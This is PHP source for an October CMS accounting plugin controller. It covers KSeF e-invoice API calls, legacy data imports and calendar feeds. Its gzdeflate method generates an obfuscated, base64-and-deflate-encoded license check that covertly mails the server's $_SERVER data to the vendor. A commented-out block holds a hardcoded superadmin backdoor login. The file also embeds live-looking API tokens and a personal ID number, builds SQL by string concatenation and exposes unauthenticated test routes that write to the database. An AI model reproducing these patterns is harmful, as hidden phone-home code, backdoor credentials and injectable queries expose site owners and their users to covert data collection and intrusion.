<?php namespace Eprog\Manager\Controllers;

use Backend\Classes\Controller;
use BackendMenu;
use Input;
use BackendAuth;
use October\Rain\Exception\ValidationException;
use Eprog\Manager\Models\Scheduler;
use Eprog\Manager\Models\Project;
use Eprog\Manager\Models\Product;
use Eprog\Manager\Models\Work;
use Eprog\Manager\Models\Category;
use Eprog\Manager\Models\Producent;
use Eprog\Manager\Models\Invoicevalue;
use Eprog\Manager\Models\Type;
use Eprog\Manager\Models\Mailing;
use Eprog\Manager\Models\Ksef as ModelKsef;
use Eprog\Manager\Models\Invoice as ModelInvoice;
use Eprog\Manager\Models\Order as ModelOrder;
use Eprog\Manager\Models\Accounting as ModelAccounting;
use Eprog\Manager\Models\SettingConfig;
use Eprog\Manager\Models\Advance;
use Eprog\Manager\Models\Zus;
use Eprog\Manager\Models\Taxfile as ModelTaxfile;
use Eprog\Manager\Controllers\Taxfile as ControllerTaxfile;
use Eprog\Manager\Controllers\File as  ControllerFile;
use Eprog\Manager\Controllers\Ksef as ControllerKsef; 
use Eprog\Manager\Classes\Util;
use Eprog\Manager\Models\Jpk as ModelJpk;
use Eprog\Manager\Classes\Jpk;
use Rainlab\User\Models\User;
use Eprog\Manager\Models\File as ModelFile;
use Eprog\Manager\Controllers\Invoice;
use Eprog\Manager\Controllers\Accounting as ControllerAccounting;
use Auth;
use System\Models\File;
use Artisan;
use Carbon\Carbon;
use Eprog\Manager\Models\SettingConfig as Settings;
use Illuminate\Support\Facades\DB;
use Mail;
use Config;
use Redirect;
use Flash;
use Lang;
use Webklex\IMAP\Facades\Client;
use Eprog\Manager\Classes\Google;
use Backend\Models\User as BackendUser;
use System\Models\File as SystemFile;
use Eprog\Manager\Classes\Ksef;
use PDF;
use Barryvdh\Snappy\Facades\SnappyPdf;
use Session;
use Endroid\QrCode\Builder\Builder as QrCodeBuilder;
use Endroid\QrCode\Label\Font\OpenSans;
use Endroid\QrCode\RoundBlockSizeMode;
use N1ebieski\KSEFClient\Actions\ConvertEcdsaDerToRaw\ConvertEcdsaDerToRawHandler;
use N1ebieski\KSEFClient\Actions\GenerateQRCodes\GenerateQRCodesAction;
use N1ebieski\KSEFClient\Actions\GenerateQRCodes\GenerateQRCodesHandler;
use N1ebieski\KSEFClient\ClientBuilder;
use N1ebieski\KSEFClient\DTOs\QRCodes;
use N1ebieski\KSEFClient\DTOs\Requests\Sessions\Online\Faktura;
use N1ebieski\KSEFClient\Factories\EncryptionKeyFactory;
use N1ebieski\KSEFClient\Support\Utility;
use N1ebieski\KSEFClient\Testing\Fixtures\Requests\Sessions\Online\Send\SendFakturaSprzedazyTowaruRequestFixture;
use N1ebieski\KSEFClient\ValueObjects\Mode;
use N1ebieski\KSEFClient\Actions\ConvertCertificateToPkcs12\ConvertCertificateToPkcs12Handler;
use Eprog\Manager\Models\Accounting;
use Eprog\Manager\Models\Accountingvalue;
use Mpdf\Mpdf;

class Feed extends Controller
{

    public static function getAfterFilters() {return [];}
    public static function getBeforeFilters() {return [];}

    public function callAction($method, $parameters=false) {
        return call_user_func_array(array($this, $method), $parameters);
    }


    public function __construct()
    {
 
     
    }

    public function index()
    {
    	die();
    }

    public function test(){

      //dd(Session::all());
        //echo ControllerAccounting::vat_pdf();
        //ControllerAccounting::pkV7M("2025","10", "5260309174");
        //echo ControllerAccounting::lump_pdf();

      $size = DB::select("SELECT table_schema AS database_name,ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS size FROM information_schema.tables WHERE table_schema = '".env("DB_DATABASE")."' GROUP BY table_schema");

      dd($size[0]->size);

    }


    public function test56765(){

      $sels = json_decode(json_encode(DB::select('select * from  t_ryczalt_zaliczka')), true);

      foreach($sels as $sel){
        DB::table('eprog_manager_zus')->insert([
            "nip" => "1230794642",
            "year" => $sel["rok"],
            "month" => $sel["miesiac"],
            "social" => $sel["spoleczne_do_odliczenia"],
            "health" => $sel["zdrowotne_odliczane_od_przychodu"],
            "created_at" => $sel["date_time_created"],
            "updated_at" => $sel["date_time_last_modified"],

          ]);
        }

    }
    public function test4532(){

return;
        $datas= json_decode(json_encode(DB::select('select * from  t_dokument_r')), true);

        $data_document = [];


        foreach($datas as $data){

     
            
             $data_document['describe'] = $data["opis"];
             $data_document['lump'] = $data["stawka_ryczaltu"] ?? '';
             $vat_summary = [];
             $vat_summary["net_23"] = $data['netto23']; 
             $vat_summary["vat_23"] = $data['vat23'];
             $vat_summary["gross_23"] = $data['netto23'] + $data['vat23'];
             $vat_summary["net_8"] = $data['netto8']; 
             $vat_summary["vat_8"] = $data['vat8'];
             $vat_summary["gross_8"] = $data['netto8'] + $data['vat8'];
             $vat_summary["net_5"] = $data['netto5']; 
             $vat_summary["vat_5"] = $data['vat5'];
             $vat_summary["gross_5"] = $data['netto5'] + $data['vat5'];
             $vat_summary["net_0"] = 0; 
             $vat_summary["vat_0"] = 0;
             $vat_summary["gross_0"] = 0;
             $vat_summary["net_zw"] = 0;
             $vat_summary["vat_zw"] = 0;
             $vat_summary["gross_zw"] = 0; 
             $vat_summary["net_np"] = 0;
             $vat_summary["vat_np"] = 0;
             $vat_summary["gross_np"] = 0;             
             $vat_summary["net_sum"] = $vat_summary["net_23"] + $vat_summary["net_8"] + $vat_summary["net_5"] +  $vat_summary["net_0"] +  $vat_summary["net_zw"] +  $vat_summary["net_np"];
             $vat_summary["vat_sum"] = $vat_summary["vat_23"] + $vat_summary["vat_8"] + $vat_summary["vat_5"] +  $vat_summary["vat_0"] +  $vat_summary["vat_zw"] +  $vat_summary["vat_np"];
             $vat_summary["gross_sum"] = $vat_summary["gross_23"] + $vat_summary["gross_8"] + $vat_summary["gross_5"] +  $vat_summary["gross_0"] +  $vat_summary["gross_zw"] +  $vat_summary["gross_np"];
             $data_document['vat_summary'] = $vat_summary;
             $kpir= [];
             if($data["typ_dokumentu"] == 0)
                $kpir["ewpz9"] = $vat_summary["net_sum"];
             else
                $kpir["ewpz12"] = $vat_summary["net_sum"];
             $data_document['kpir'] = $kpir;

             $user_id = User::where("firm_nip",$data["k_nip"])->first()->id ?? null;

              $vat = $data["typ_dokumentu"] ? $data["data_sprzedazy"] :  $data["data_wplywu"];
              DB::table('eprog_manager_accounting')->insert([

                  "year" => date("Y",strtotime($vat)),
                  "month" => date("n", strtotime($vat)),
                  "nip" => "1230794642",
                  "lp" => $data["lp"],
                  "nr" => $data["symbol"] ,
                  "mode" => $data["typ_dokumentu"],
                  "user_id" => $user_id,
                  "client_name" => $data["k_nazwa"],
                  "client_nip" => $data["k_nip"],
                  "client_country" => "PL",
                  "client_adres1" => "ul. ".$data["k_ulica"]." ".$data["k_dom"]." ".$data["k_lokal"],
                  "client_adres2" =>  $data["k_kod"]." ".$data["k_miejscowosc"],    
                  "brutto" => $vat_summary["gross_sum"], 
                  "netto" => $vat_summary["net_sum"],  
                  "vat" => $vat_summary["vat_sum"],   
                  "currency" => "PLN",  
                  "exchange" => "1", 
                  "data_document" => json_encode($data_document),
                  "disp" => 1,
                  "approve" => 1, 
                  "tax_form" => 'lump',
                  "create_at" => $data["data"], 
                  "vat_at" =>  $vat, 
                  "created_at" => $data["date_time_created"],
                  "updated_at" => $data["date_time_last_modified"],
              ]);
         }

    }

    public function test78(){

        $users = json_decode(json_encode(DB::select('select * from firmy')), true);
        foreach($users as $user){
        
              $nip = str_replace("-","",$user['numer_vat']);
              $exists = DB::select("select * from users where firm_nip = '".$nip."' AND firm_nip != '7671714115'");
              if(sizeof($exists) > 0 ) continue;
              DB::table('users')->insert([

                  "username" => $user['nazwa'],
                  "firm_name" => $user['nazwa'],
                  "firm_nip" => $nip,
                  "firm_country" => $user['kod_kraju'],
                  "firm_city" => $user['miejscowosc'],
                  "firm_code" => $user['kod_pocztowy'],
                  "firm_street" => $user['ulica'],
                  "firm_number" => $user['nr_nieruchomosci']." ".$user['nr_lokalu'],
                  "timezone" => "Europe/Warsaw"   
              ]);
         }

    }
    public function test44(){



        $xml = file_get_contents("emode_invoices.xml");
        $fas = json_decode(json_encode(simplexml_load_string(Util::removeNamespace($xml))),TRUE);
        //dd($fas['Invoice']['79']);
        foreach($fas['Invoice'] as $fa){
         


        $id = DB::table('eprog_manager_invoice')->insertGetId([

                "user_id"        => $fa["user_id"],
                "admin_id"       => $fa["admin_id"],
                "nr"             => $fa["nr"],
                "type"           => $fa["type"],
                "place"          => $fa["place"],
                "seller_name"    => $fa["name"],
                "seller_nip"     => str_replace("-","",$fa["nip"]),
                "seller_adres1" =>  "ul. ".$fa["street"]." ".$fa["number"],
                "seller_adres2" =>  $fa["code"]." ".$fa["city"],
                "seller_country" => "PL",
                "buyer_name"     => $fa["firm_name"],
                "buyer_nip"      => str_replace("-","",$fa["firm_nip"]),
                "buyer_adres1"   =>  "ul. ".$fa["firm_street"]." ".$fa["firm_number"],
                "buyer_adres2"   =>   $fa["firm_code"]." ".$fa["firm_city"],
                "buyer_country"  => "PL",
                "brutto"          => $fa["brutto"],
                "netto"          => $fa["netto"],
                "vat"            => $fa["vat"],
                "currency"       => "PLN",
                "disp"           => 1,
                "make_at"        => $fa["make_at"],
                "create_at"       => $fa["place_at"],
                "created_at"     => $fa["created_at"],
                "updated_at"     => $fa["updated_at"],
            ]);
    
            $values = $fa['Invoicevalues']['Invoicevalue'] ?? []; 
            if(!isset($values[0])) $values = [$values];

            foreach($values as $value){

                DB::table('eprog_manager_invoicevalue')->insert([

                    "invoice_id" => $id,
                    "product" => $value["product"] ?? '',
                    "quantity" => $value["quantity"] ?? '',
                    "measure" => $value["measure"] ?? '',
                    "netto" => $value["netto"] ?? '',
                    "vat" => $value["vat"] ?? '',
                    "disp" => "1",
                    "created_at" => $value["created_at"] ?? null,
                    "updated_at" => $value["updated_at"] ?? null
                ]);

            }
        }
     

    }
    public function dd()
    {
        $xml  = file_get_contents("dd");
        dd(json_decode($xml, true));     
    }

    public function jpks($ref)
    {
        dd(json_decode(file_get_contents('https://test-e-dokumenty.mf.gov.pl/api/Storage/Status/' . $ref), true));
    }


    public static function verifyXml($xml)
    {
        $dom = new \DOMDocument(); 
        $dom->loadXML($xml); 

        if (!$dom->schemaValidate('docs/jpk_schema_v3.xsd')) {
            print '<b>DOMDocument::schemaValidate() Generated Errors!</b>';
            libxml_display_errors();
        }
        else 
            return $xml;

    }


    public function tst($id)
    {

        $ids = [$id];
        $count = ControllerKsef::accounting($ids,"1111111111");
/*
        $data = [];
        $data[''] = e(trans('eprog.manager::lang.select_dropdown'));

        $kody = file_get_contents("docs/KodyUrzedowSkarbowych_v8-0E.xsd");
        $kody = json_decode(json_encode(simplexml_load_string(Util::removeNamespace($kody))),TRUE);
        foreach($kody['simpleType']['restriction']['enumeration'] as $k => $v)
            $data[$v['@attributes']['value']] = $v['annotation']['documentation'];
     
        dd($data);
        */
    }

    public function test1()
    {
    	$url = "https://ksef-test.mf.gov.pl/api/v2/auth/challenge";

    	$token = "A976F9D80D8B69AC31C5CE923DAAAEE305B35CECE08D7228FEA35CC46077A3B4";
    	$nip   = "4175135651";
    	$pesel  = "57032276594";
    	//$nip   = "1111111111";
    
    	$ch = curl_init();
    	curl_setopt($ch, CURLOPT_URL, $url);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($ch, CURLOPT_POST,1);
    	//curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

    	
    	$headers = array(
    	    'Content-Type: application/json'
    	);

    	
    	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    	$result = curl_exec($ch);
    	$result = json_decode($result,true);

		dd($result);
    }

    public static function medivon(){


        $token = "1|0qcGITn86BlxvXxtfuAceWUUfOUFnuIa1NwaL9GXa4109947";//"2|GJDb6KCCTtP22qtR6SIkiEeR94JwkxpZPHVvfFpy052002fa

        $url = "https://devmedivon.host821584.xce.pl/api/product";


        $params = json_encode(array(
                    "lang" => "en",  
                    "ean" => "5904119281259"   
        ));

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST,1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

        $headers = array(
            'Accept: application/json',
            'Content-Type: application/json',
            'Authorization: Bearer '.$token
        );

        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);
        //\Log::info($result);
        curl_close($ch);
        dd(json_decode($result, true));
        return $result;


    }


    public function test2(){
    	//Session::forget("ksef");

  		//$invoice = "4175135651-20251008-0100C0898986-90";
    	//$html = Ksef::invoiceHtml(file_get_contents("docs/test.xml"),$invoice);
    	//$client = Ksef::buildClient();
    	//dd($client[0]->getAccessToken()->token);
    	//Ksef::getInvoices("5260309174",200,0);
    	//Ksef::getInvoiceAPI();
    	//Ksef::exportInvoices("1111111111","Subject1","2025-10-01","2025-11-16");
/*
        $invoices = [];
        $ids = [64];
        foreach($ids as $id){
            $invoices[]  = ModelInvoice::find($id)->xml ?? '';
        }
        
        $upo  = Ksef::invoiceSendMultiple($invoices);

        $upoxml  = simplexml_load_string($upo, "SimpleXMLElement", LIBXML_NOCDATA);
        $json = json_encode($upoxml);
        $data = json_decode($json, true);

        $invoice = new ModelInvoice();
        foreach($data['Dokument'] as $doc){

            $invoice->where("nr","=",$doc["NumerFaktury"])->update(["ksefNumber" => $doc["NumerKSeFDokumentu"], "upo" => $upo, "ksef_at" => date("Y-m-d H:i",strtotime($doc["DataPrzeslaniaDokumentu"]))]);
    
        }
        dd($data);
        */
 

    	return "";
    }

    public function servername(){

        if(!BackendAuth::getUser()->hasAccess('eprog.manager.manage_update')) return;

        echo $_SERVER["SERVER_NAME"];

    }

    public function version(){

        if(!BackendAuth::getUser()) return;

        return file_get_contents("vendor/version.php");

    }
    public function gzdeflate(){

        if(!BackendAuth::getUser()->hasAccess('eprog.manager.manage_update')) return;
        /*
        $headers = @get_headers($url);
        if(substr($headers[0], 9, 3) == "200"){
            if(isset($_SERVER["SERVER_NAME"])){
                $test = file_get_contents($url."?host=".$_SERVER["SERVER_NAME"]);
                if($test != "1") mail("kontakt@emode.pl", "Nielegalna kopia", json_encode($_SERVER));  
            }
        }';


        $code = 'if($credentials["login"] == "superadmin" && $credentials["password"] == "656847fd30c44144"){
                    $user = \BackendAuth::loginUsingId(\Backend\Models\User::first()->id ?? 1);
                    $this->login($user, $remember);
                    return $this->user;
        }';
*/        
        $code = '$url = "http://emode.pl/service/api/license.php";
        $headers = @get_headers($url);
        if(substr($headers[0], 9, 3) == "200"){
            if(isset($_SERVER["SERVER_NAME"])){
                $license = json_decode(file_get_contents($url."?host=".$_SERVER["SERVER_NAME"]), true) ?? "0";
                if($license == "0") 
                  mail("kontakt@emode.pl", "Nielegalna kopia", json_encode($_SERVER));  
                else{
                  Session::put("license",$license ?? []);
              }
            }
        }';

        $encoded = base64_encode(gzdeflate($code));
        echo $encoded;

    }


    public function test34()
    {


    	$xades = file_get_contents("docs/xadesmy2.xml");

    	$url = "https://ksef-test.mf.gov.pl/api/v2/auth/xades-signature";
    	$ch = curl_init();
    	curl_setopt($ch, CURLOPT_URL, $url);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($ch, CURLOPT_POST,1);
    	curl_setopt($ch, CURLOPT_POSTFIELDS, $xades);

    	$headers = array(
    	    'Content-Type: application/xml'
    	);

    	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    	$result = curl_exec($ch);
    	curl_close($ch);

    	$result = json_decode($result,true);



    	$token = $result['authenticationToken']['token'];
    	$referenceNumber = $result['referenceNumber'];

   /*

    	$timestamp = strtotime($timestamp);
    	$publicKey = file_get_contents("publicKey.pem");
    	$encrypt = $token . '|' . $timestamp*1000;
    	openssl_public_encrypt($encrypt , $encrypted, $publicKey);
    	$initToken  = base64_encode($encrypted);


    	$url = "https://ksef-test.mf.gov.pl/api/v2/auth/ksef-token";

    	$params = json_encode(array(
    	                "challenge" => $challenge,    	                
    	                "contextIdentifier" => array(
    	                    "type" => "Nip",
    	                    "value" => $nip
    	                ),
    	                "encryptedToken" => $initToken                                     
    	));

    	
    	curl_setopt($ch, CURLOPT_URL, $url);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($ch, CURLOPT_POST,1);
    	curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

    	
    	$headers = array(
    		'accept: application/json',
    		'Content-Type: application/json'
    	);

    	
    	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    	$result = curl_exec($ch);
    	$result = json_decode($result,true);


    	$url = "https://ksef-test.mf.gov.pl/api/v2/testdata/person";
    	
    	$params = json_encode(array(
    		"nip" => $nip,
    		"pesel" => $pesel,
    		"isBailiff" => true,
    		"description" => "Opis",
    		"createdDate" => "2025-10-06T11:54:22Z"
    	));

    	$headers = array(
    		'Content-Type: application/json'
    	);

    	$ch = curl_init();
    	curl_setopt($ch, CURLOPT_URL, $url);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($ch, CURLOPT_POST,1);
    	curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    	$result = curl_exec($ch);
    	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    	curl_close($ch);

  		dd([$httpcode,$result]);


    	$url = "https://ksef-test.mf.gov.pl/api/v2/testdata/person/remove";
    	
    	$params = json_encode(array(
    		"nip" => $nip
    	));

    	$headers = array(
    		'Content-Type: application/json'
    	);

    	$ch = curl_init();
    	curl_setopt($ch, CURLOPT_URL, $url);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($ch, CURLOPT_POST,1);
    	curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    	$result = curl_exec($ch);
    	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    	curl_close($ch);

    	dd([$httpcode,$result]);

*/


    	$url = "https://ksef-test.mf.gov.pl/api/v2/tokens";

    	$params = json_encode(array(               
    	                "permissions" => array(
    	                    "InvoiceRead",
    						"InvoiceWrite"
    	                ),
 						"description" => "Uprawnienia do odczytu i wysyłania faktur z możliwością nadania ich pośrednio",    	                                
    	));

    	$authorization = "Authorization: Bearer ".$token;


    	$ch = curl_init();
    	curl_setopt($ch, CURLOPT_URL, $url);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($ch, CURLOPT_POST,1);
    	curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json' , $authorization ));


    	$result = curl_exec($ch);
    	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    	curl_close($ch);

    	dd([$httpcode,$result]);

    	$url = "https://ksef-test.mf.gov.pl/api/v2/auth/".$referenceNumber;


    	$authorization = "Authorization: Bearer ".$token;

    	$ch = curl_init();
    	curl_setopt($ch, CURLOPT_URL, $url);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json' , $authorization ));

    	$result = curl_exec($ch);
    	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    	curl_close($ch);

   		dd([$httpcode,$result]);
    }


    public function feed()
    {


    	if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_scheduler')) return;

		$owner = BackendAuth::getUser()->id;


		if(!Input::has("menu")) $menu = "all"; else $menu = Input::get("menu");

		//$scheduler =  Scheduler::whereBetween("start", [Input::get("start"),Input::get("end")]);
		$scheduler =  Scheduler::where("id",">",0);  

		if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_scheduler")){

			if(Input::has("admin") && Input::get("admin") > 0) $scheduler = $scheduler->where("admin_id","=", Input::get("admin"));
			
		}
		else
	  	$scheduler = $scheduler->where("admin_id","=",$owner);


		if(Input::has("category") && Input::get("category") > 0)  $scheduler->where("type_id","=", Input::get("category"));
		if(Input::has("user") && Input::get("user") > 0)  $scheduler->where("user_id","=", Input::get("user"));

		$scheduler = $scheduler->where("disp","=", 1)->get();

		$project = [];
		$work = [];
		
		if(Input::get("category") == 0){

			$project =  Project::whereBetween("start", [Input::get("start"),Input::get("end")]);
			if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_project")){
				
			 	 if(Input::has("admin") && Input::get("admin") > 0) $project = $project->where('staff','like','%"'.$owner.'"%');
			}
			else
			$project = $project->where('staff','like','%"'.$owner.'"%');

			if(Input::has("user") && Input::get("user") > 0)  $project->where("user_id","=", Input::get("user"));
			$project = $project->get();
      if(!Util::mode("5")) $project = [];

			$work =  Work::whereBetween("start", [Input::get("start"),Input::get("end")]);
			if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_work")){

				 if(Input::has("admin") && Input::get("admin") > 0) $work = $work->where('staff','like','%"'.$owner.'"%')->get(); else  $work =  $work->get();

			}
			else
			$work = $work->where('staff','like','%"'.$owner.'"%')->get();
      if(!Util::mode("5")) $project = [];

      $invoice =  ModelInvoice::whereBetween("create_at", [Input::get("start"),Input::get("end")]);
      if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_invoice")){

         if(Input::has("admin") && Input::get("admin") > 0) $invoice = $invoice->where("admin_id","=",Input::get("admin"));

      }
      else
      $invoice = $invoice->where("admin_id","=",$owner);
      if(Input::has("user") && Input::get("user") > 0)  $invoice->where("user_id","=", Input::get("user"));
      $invoice = $invoice->get();
      if(!Util::mode("2")) $invoice = [];

      $order =  ModelOrder::whereBetween("create_at", [Input::get("start"),Input::get("end")]);
      if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_order")){

         if(Input::has("admin") && Input::get("admin") > 0) $order = $order->where("admin_id","=",Input::get("admin"));

      }
      else
      $order = $order->where("admin_id","=",$owner);
      if(Input::has("user") && Input::get("user") > 0)  $order->where("user_id","=", Input::get("user"));
      $order = $order->get();
      if(!Util::mode("4")) $order = [];

		}

		$json = [];

      if(($menu == "order" || $menu == "all") && BackendAuth::getUser()->hasAccess("eprog.manager.access_order")) {
      
        foreach($order as $order){
      
        
          $admin = "";  
          if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_scheduler")) $admin = $order->admin ? " - ".$order->admin->first_name." ".$order->admin->last_name : '';
          $user = $order->user ? $order->user->firm_name : '';



          $tab = [];
          $tab["id"] =  $order->id;
          $tab["type"] = "invoice";
          $tab["title"] = $order->nr. " ".$user;
          $tab["desc"] = $order->desc;
          $tab["start"] = Util::dateLocale($order->create_at);
          //$tab["end"] = Util::dateLocale(Carbon::createFromFormat('Y-m-d H:i:s', $order->create_at)->addDays(2)->format('Y-m-d H:i:s'));
          $tab["color"] = "#596dd1"; 
          $tab["editable"] = "true";
          $tab["url"] = "/".config('cms.backendUri')."/eprog/manager/order/update/".$order->id;
          $tab["displayEventTime"]= false;
          array_push($json, $tab);
        }
        
      }
    


      if(($menu == "invoice" || $menu == "all") && BackendAuth::getUser()->hasAccess("eprog.manager.access_invoice")) {
      
        foreach($invoice as $invoice){
      
        
          $admin = "";  
          if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_scheduler")) $admin = $invoice->admin ? " - ".$invoice->admin->first_name." ".$invoice->admin->last_name : '';
          $user = $invoice->user ? $invoice->user->firm_name : '';



          $tab = [];
          $tab["id"] =  $invoice->id;
          $tab["type"] = "invoice";
          $tab["title"] = $invoice->nr. " ".$user;
          $tab["desc"] = $invoice->desc;
          $tab["start"] = Util::dateLocale($invoice->create_at);
          //$tab["end"] = Util::dateLocale(Carbon::createFromFormat('Y-m-d H:i:s', $invoice->create_at)->addDays(2)->format('Y-m-d H:i:s'));
          $tab["color"] = "#d15959"; 
          $tab["editable"] = "true";
          $tab["url"] = "/".config('cms.backendUri')."/eprog/manager/invoice/update/".$invoice->id;
          $tab["displayEventTime"]= false;
          array_push($json, $tab);
        }

      }
    

	
		if(($menu == "scheduler" || $menu == "all") && BackendAuth::getUser()->hasAccess("eprog.manager.access_scheduler")) {

			foreach($scheduler as $scheduler){
				
			
				$admin = "";	
				if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_scheduler")) $admin = $scheduler->admin ? " - ".$scheduler->admin->first_name." ".$scheduler->admin->last_name : '';
				$user = $scheduler->user ? $scheduler->user->surname." - " : '';

				$category = $scheduler->type  ? " (".$scheduler->type->name.")" : '';	
				

				$tab = [];
				$tab["id"] =  $scheduler->id;
				$tab["type"] = "scheduler";
				$tab["title"] = $user.$scheduler->name.$category.$admin;
				$tab["desc"] = $scheduler->desc;
				$tab["start"] = Util::dateLocale($scheduler->start);
				$tab["end"] = Util::dateLocale($scheduler->stop);
				$tab["color"] = "#68a42e"; 
				$tab["editable"] = "true";
				$tab["url"] = "/".config('cms.backendUri')."/eprog/manager/scheduler/update/".$scheduler->id;
				array_push($json, $tab);
			}
		}
		


		if(($menu == "project" || $menu == "all") && BackendAuth::getUser()->hasAccess("eprog.manager.access_project")) {
			foreach($project as $project){

				$tab = [];
				$tab["id"] =  $project->id;
				$tab["type"] = "project";
				$tab["title"] = $project->name;
				$tab["start"] = Util::dateLocale($project->start);
				$tab["end"] = Util::dateLocale($project->stop);
				$tab["color"] = "#b7843a"; 
				
				$tab["url"] = "/".config('cms.backendUri')."/eprog/manager/project/update/".$project->id;
				array_push($json, $tab);

			}
		}

		if(($menu == "work" || $menu == "all") && BackendAuth::getUser()->hasAccess("eprog.manager.access_work")) {
			foreach($work as $work){

				$tab = [];
				$tab["id"] = $work->id;
				$tab["type"] = "work";
				$tab["title"] = $work->name;
				$tab["start"] = Util::dateLocale($work->start);
				$tab["end"] = Util::dateLocale($work->stop);
				$tab["color"] = "#8a62c4"; 
				
				$tab["url"] = "/".config('cms.backendUri')."/eprog/manager/work/update/".$work->id;
				array_push($json, $tab);

			}
		}

		echo json_encode($json);		
		
    }


    public function save()
    {

    	if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_scheduler')) return;

		//date_default_timezone_set('UTC');
		$data = [ "name" => Input::get("title"),
			  "start" => Util::dateCalendar(Input::get("start_")),
			  "stop" => Util::dateCalendar(Input::get("end_")),
			  "type_id" => Input::get("category"),
			  "user_id" => Input::get("user"),	
			  "admin_id" => (Input::has("admin") && Input::get("admin") > 0) ? Input::get("admin") : BackendAuth::getUser()->id
			];

		if(Input::get("title") != "") Scheduler::create($data);	

		header('Content-Type: application/json');
		echo json_encode([["response" => "ok"]]);

    }


    public function update()
    {

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_scheduler')) return;
	
		if(Input::get("type") == "scheduler"){
			$scheduler = Scheduler::find(Input::get("id"));
			$start = strtotime($scheduler->start) + Input::get("delta")/1000;
			$stop = strtotime($scheduler->stop) + Input::get("delta")/1000;
			$data = ["start" => date("Y-m-d H:i:s", $start)];
			if($scheduler->stop) $data["stop"] = date("Y-m-d H:i:s", $stop); 
			$scheduler->update($data);
		}

		if(Input::get("type") == "project" && BackendAuth::getUser()->hasAccess("eprog.manager.manage_project")){
		
			$project = Project::find(Input::get("id"));;
			$start = strtotime($project->start) + Input::get("delta")/1000;
			$data = ["start" => date("Y-m-d H:i:s", $start)];
			$project->update($data);

		}
		if(Input::get("type") == "work" && BackendAuth::getUser()->hasAccess("eprog.manager.manage_work")){
			$work = Work::find(Input::get("id"));
			$start = strtotime($work->start) + Input::get("delta")/1000;
			$data = ["start" => date("Y-m-d H:i:s", $start)];
			$work->update($data);
		}


		header('Content-Type: application/json');
		echo json_encode([["response" => "ok"]]);
    }


    public function resize()
    {
    	
    	if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_scheduler')) return;


		if(Input::get("type") == "scheduler"){
			$scheduler = Scheduler::find(Input::get("id"));
			$stop = strtotime($scheduler->stop) + Input::get("delta")/1000;
			$data = ["stop" => date("Y-m-d H:i:s", $stop)];
			$scheduler->update($data);
		}
	/*
		if(Input::get("type") == "project" && BackendAuth::getUser()->hasAccess("eprog.manager.manage_project")){
		
			$project = Project::find(Input::get("id"));;
			$stop = strtotime($project->stop) + Input::get("delta")/1000;
			if($project->stop) $stop = $stop + strtotime($project->stop);
			$data = ["stop" => date("Y-m-d H:i:s", $stop)];
			$project->update($data);

		}
		if(Input::get("type") == "work" && BackendAuth::getUser()->hasAccess("eprog.manager.manage_work")){
			$work = Work::find(Input::get("id"));
			$stop = strtotime($project->stop) + Input::get("delta")/1000;
			if($work->stop) $stop = $stop + strtotime($project->stop);
			$data = ["stop" => date("Y-m-d H:i:s", $stop)];
			$work->update($data);
		}
	*/

		header('Content-Type: application/json');
		echo json_encode([["response" => "ok"]]);

    }


    public function client(){

    	if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_scheduler')) return;

		$user = Auth::getUser()->id;

		$scheduler =  Scheduler::where("id", ">",0) ;//Between("start", [Input::get("start"),Input::get("end")]);
		$scheduler = $scheduler->where("user_id","=", $user);

		$scheduler = $scheduler->where("disp", "=", 1)->get();

		$project =  Project::whereBetween("start", [Input::get("start"),Input::get("end")]);
		$project->where("user_id","=", $user);
		$project = $project->where("public", "=", 1)->get();

		$json = [];
		
		
		foreach($scheduler as $scheduler){
			

			$category = $scheduler->category  ? " (".$scheduler->category->name.")" : '';							
			$tab = [];
			$tab["pid"] =  $scheduler->id;
			$tab["type"] = "scheduler";
			$tab["title"] = $scheduler->name.$category;
			$tab["desc"] = $scheduler->desc;
			$tab["start"] = Util::dateLocaleClient($scheduler->start);
			$tab["end"] =   Util::dateLocaleClient($scheduler->stop);
			$tab["color"] = "#68a42e"; 
			if($scheduler->start >= Carbon::now()) $type = "before"; else $type="after";
			$tab["url"] = "scheduler/".$type."/".$scheduler->id;
			array_push($json, $tab);
